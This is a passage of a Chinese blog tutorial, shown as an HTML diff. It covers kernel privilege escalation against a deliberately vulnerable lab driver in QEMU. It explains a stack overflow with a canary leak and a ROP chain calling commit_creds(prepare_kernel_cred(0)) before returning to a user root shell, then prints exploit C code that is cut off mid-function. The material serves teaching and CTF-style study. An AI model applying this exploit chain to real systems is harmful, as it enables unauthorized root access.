@@ -1,0 +1,726 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+>
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>linux 内核提权总结(demo&#43;exp分析) -- ROP(一) - povcfe&#39;s site</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="发表于看雪论坛
+基础ROP篇(linux 5.0.21) 内核提权与用户态攻击的区别
+攻击流程
+用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell 内核提权: 内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell 理解难点
+内核rop链构造 用户态进程与内核之间的切换 一. 漏洞分析 (建议初学者先了解基础的驱动程序知识) 查看驱动安全机制
+checksec rop.ko [*] &#39;/home/povcfe/linux/flod/rop.ko&#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0) 发现开启canary和NX 查看qemu启动脚本boot.sh
+boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64 \ -nographic \ -gdb tcp::1234 查看开机自启脚本
+rcS #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys echo /sbin/mdev &gt; /proc/sys/kernel/hotplug # 支持热拔插 /sbin/mdev -s cat /proc/kallsyms &gt; /tmp/kallsyms # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录 insmod rop." />
+  <meta name="author" content="povcfe" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://povcfe.github.io/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/theme.png" />
+
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/avatar.jpg" />
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/twitter.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/github.svg" />
+  
+  <link rel="preload" as="image" href="https://povcfe.github.io/rss.svg" />
+  
+  
+
+  
+  
+  <script
+    defer
+    src="https://povcfe.github.io/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  
+  
+
+  
+  <link rel="icon" href="https://povcfe.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://povcfe.github.io/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.111.3">
+
+  
+  
+  
+  
+  
+  <meta itemprop="name" content="linux 内核提权总结(demo&#43;exp分析) -- ROP(一)">
+<meta itemprop="description" content="发表于看雪论坛
+基础ROP篇(linux 5.0.21) 内核提权与用户态攻击的区别
+攻击流程
+用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell 内核提权: 内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell 理解难点
+内核rop链构造 用户态进程与内核之间的切换 一. 漏洞分析 (建议初学者先了解基础的驱动程序知识) 查看驱动安全机制
+checksec rop.ko [*] &#39;/home/povcfe/linux/flod/rop.ko&#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0) 发现开启canary和NX 查看qemu启动脚本boot.sh
+boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64 \ -nographic \ -gdb tcp::1234 查看开机自启脚本
+rcS #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys echo /sbin/mdev &gt; /proc/sys/kernel/hotplug # 支持热拔插 /sbin/mdev -s cat /proc/kallsyms &gt; /tmp/kallsyms # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录 insmod rop."><meta itemprop="datePublished" content="2020-01-01T00:00:00-04:00" />
+<meta itemprop="dateModified" content="2020-01-01T00:00:00-04:00" />
+<meta itemprop="wordCount" content="770">
+<meta itemprop="keywords" content="" />
+  
+  <meta property="og:title" content="linux 内核提权总结(demo&#43;exp分析) -- ROP(一)" />
+<meta property="og:description" content="发表于看雪论坛
+基础ROP篇(linux 5.0.21) 内核提权与用户态攻击的区别
+攻击流程
+用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell 内核提权: 内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell 理解难点
+内核rop链构造 用户态进程与内核之间的切换 一. 漏洞分析 (建议初学者先了解基础的驱动程序知识) 查看驱动安全机制
+checksec rop.ko [*] &#39;/home/povcfe/linux/flod/rop.ko&#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0) 发现开启canary和NX 查看qemu启动脚本boot.sh
+boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64 \ -nographic \ -gdb tcp::1234 查看开机自启脚本
+rcS #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys echo /sbin/mdev &gt; /proc/sys/kernel/hotplug # 支持热拔插 /sbin/mdev -s cat /proc/kallsyms &gt; /tmp/kallsyms # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录 insmod rop." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://povcfe.github.io/post/kernel_rop1/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-01-01T00:00:00-04:00" />
+<meta property="article:modified_time" content="2020-01-01T00:00:00-04:00" />
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="linux 内核提权总结(demo&#43;exp分析) -- ROP(一)"/>
+<meta name="twitter:description" content="发表于看雪论坛
+基础ROP篇(linux 5.0.21) 内核提权与用户态攻击的区别
+攻击流程
+用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell 内核提权: 内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell 理解难点
+内核rop链构造 用户态进程与内核之间的切换 一. 漏洞分析 (建议初学者先了解基础的驱动程序知识) 查看驱动安全机制
+checksec rop.ko [*] &#39;/home/povcfe/linux/flod/rop.ko&#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0) 发现开启canary和NX 查看qemu启动脚本boot.sh
+boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64 \ -nographic \ -gdb tcp::1234 查看开机自启脚本
+rcS #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys echo /sbin/mdev &gt; /proc/sys/kernel/hotplug # 支持热拔插 /sbin/mdev -s cat /proc/kallsyms &gt; /tmp/kallsyms # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录 insmod rop."/>
+
+  
+  
+  
+  <link rel="canonical" href="https://povcfe.github.io/post/kernel_rop1/" />
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="https://povcfe.github.io/"
+      >povcfe&#39;s site</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./twitter.svg)"
+        href="https://twitter.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        twitter
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/povcfe"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./rss.svg)"
+        href="https://povcfe.github.io/index.xml"
+        target="_blank"
+        rel="alternate"
+      >
+        rss
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">linux 内核提权总结(demo&#43;exp分析) -- ROP(一)</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Jan 1, 2020</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><p><a href="https://bbs.pediy.com/user-839858.htm">发表于看雪论坛</a></p>
+<h2 id="基础rop篇linux-5021">基础ROP篇(linux 5.0.21)</h2>
+<blockquote>
+<p>内核提权与用户态攻击的区别</p>
+</blockquote>
+<ul>
+<li>
+<p>攻击流程</p>
+<ul>
+<li>用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell</li>
+<li>内核提权:
+<ol>
+<li>内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限</li>
+<li>用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>理解难点</p>
+<ul>
+<li>内核rop链构造</li>
+<li>用户态进程与内核之间的切换</li>
+</ul>
+</li>
+</ul>
+<h3 id="一-漏洞分析-建议初学者先了解基础的驱动程序知识">一. 漏洞分析 (建议初学者先了解基础的驱动程序知识)</h3>
+<ol>
+<li>
+<p>查看驱动安全机制</p>
+<pre tabindex="0"><code>checksec rop.ko 
+
+[*] &#39;/home/povcfe/linux/flod/rop.ko&#39;  
+Arch:     amd64-64-little  
+RELRO:    No RELRO  
+Stack:    Canary found  
+NX:       NX enabled  
+PIE:      No PIE (0x0)  
+</code></pre><ul>
+<li>发现开启canary和NX</li>
+</ul>
+</li>
+<li>
+<p>查看qemu启动脚本boot.sh</p>
+<ul>
+<li>boot.sh</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>qemu-system-x86_64 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-kernel bzImage <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-initrd rootfs.img <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-cpu qemu64 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-nographic <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-gdb tcp::1234
+</span></span></code></pre></div></li>
+<li>
+<p>查看开机自启脚本</p>
+<ul>
+<li>rcS</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>mount -t proc none /proc
+</span></span><span style="display:flex;"><span>mount -t sysfs none /sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo /sbin/mdev &gt; /proc/sys/kernel/hotplug  <span style="color:#75715e"># 支持热拔插</span>
+</span></span><span style="display:flex;"><span>/sbin/mdev -s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /proc/kallsyms &gt; /tmp/kallsyms  <span style="color:#75715e"># 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录</span>
+</span></span><span style="display:flex;"><span>insmod rop.ko   <span style="color:#75715e"># 目标驱动</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /dev/povcfe_dev
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /dev/rop_dev  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>setsid cttyhack setuidgid <span style="color:#ae81ff">1000</span> sh
+</span></span></code></pre></div></li>
+<li>
+<p>审计代码，可以发现dangerous函数存在明显的栈溢出漏洞(降低难度直接泄漏canary)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dangerous</span>(<span style="color:#66d9ef">size_t</span> num)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> overflow[<span style="color:#ae81ff">0x10</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;canary is 0x%lx&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">size_t</span> <span style="color:#f92672">*</span>)overflow <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(overflow, kernel_buf, num);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_INFO <span style="color:#e6db74">&#34;%s&#34;</span>, overflow);
+</span></span><span style="display:flex;"><span>}   
+</span></span></code></pre></div></li>
+<li>
+<p>利用思路</p>
+<ul>
+<li>Canary通过printk泄露</li>
+<li>NX使用rop绕过</li>
+<li>读取 /tmp/kallsyms的startup_64(获得内核代码加载基地址，用于定位ROPgadget在内存中的真实地址)</li>
+<li>读取 /tmp/kallsyms的commit_creds, prepare_kernel_cred，获得目标内核函数地址</li>
+</ul>
+</li>
+</ol>
+<h3 id="二-rop链构造">二. ROP链构造</h3>
+<ul>
+<li>
+<p>内核执行commit_creds(prepare_kernel_cred(0))</p>
+<ol>
+<li>通过/tmp/kallsyms获得 commit_creds() prepare_kernel_cred() 函数地址</li>
+</ol>
+<p><img src="../../kernel_rop1/kallsyms.png" alt="kallsyms"></p>
+<ol start="2">
+<li>执行 cat tmp/kallsyms | grep startup_64, 如果startup_64不等于0xffffffff81000000, 即内核开启kalsr防护, startup_64与0xffffffff81000000 的差值即为内核基地址偏移(很多发行版默认不打开kalsr, 利用就比较简单了)</li>
+</ol>
+<p><img src="../../kernel_rop1/startup_64.png" alt="startup_64"></p>
+<ol start="3">
+<li>利用ROPgadget获得vmlinux的所有gadget片段(如果效果不理想可换用ropper)</li>
+</ol>
+<pre tabindex="0"><code>ROPgadget --binary vmlinux &gt; rop_gadget
+</code></pre><p>根据所需在rop_gadget中搜索(因为程序开启kalsr，所以 真实地址 = rop_gadget地址 + 基地址偏移)</p>
+</li>
+<li>
+<p>返回用户态</p>
+<ol>
+<li>
+<p>进入内核前，保存用户态数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> user_cs, user_ss, user_rflags, user_sp;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">save_status</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pushf;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop user_rflags;&#34;</span>
+</span></span><span style="display:flex;"><span>            );
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div></li>
+<li>
+<p>内核切换到用户态</p>
+</li>
+</ol>
+<ul>
+<li>执行swapg 恢复GS值(GS通过宏实现, 并不保存在gs寄存器)</li>
+<li>执行iretq 恢复用户态数据(或者执行sysretq 只需提供rip)
+<ul>
+<li>需要提前在栈上填充用户态数据(rip,cs,rflags,sp,ss)</li>
+<li>填充的用户态数据应在用户态切换到内核态前保存(内联汇编)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>ROP 链构造</p>
+<ol>
+<li>
+<p>commit_creds() 接收 prepare_kernel_cred(0)的返回值作为参数，即rdi &lt;- rax 时需要灵活变通(手动搜索rop_gadget文件)</p>
+</li>
+<li></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8106b910</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// pop rdi, ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> prepare_kernel_cred;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8105bd21</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// test rcx,rcx ; jne 0xffffffff8105bcc6 ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8110c68a</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// mov rdi, rax ; jne 0xffffffff8110c672 ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> commit_creds;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81a00d5e</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// swapgs ; popfq ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81024b3b</span> <span style="color:#f92672">+</span> offset; <span style="color:#75715e">// iretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">size_t</span>)get_shell;          <span style="color:#75715e">// rip
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>ROP[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="三-结果展示">三. 结果展示</h3>
+<p><img src="../../kernel_rop1/rop.png" alt="rop"></p>
+<h3 id="四-exp">四. exp</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc rop.c -masm=intel -static -o rop
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_shell</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">getuid</span>())
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;=.=&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;failed&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> user_cs, user_ss, user_rflags, user_sp;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">save_status</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__asm__</span>(<span style="color:#e6db74">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pushf;&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;pop user_rflags;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ip is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">size_t</span>)get_shell);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;cs is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_cs);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ss is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_ss);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;sp is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_sp);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;flag is 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, user_rflags);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;status has been saved.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> <span style="color:#a6e22e">get_addr</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(name) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">27</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cmd[num];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(cmd, <span style="color:#ae81ff">0</span>, num);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(cmd, <span style="color:#e6db74">&#34;cat /tmp/kallsyms | grep &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(cmd, name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(cmd, <span style="color:#e6db74">&#34; &gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcat</span>(cmd, name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;the cmd is %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cmd);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(cmd);
+</span></span><span style="display:flex;"><span>
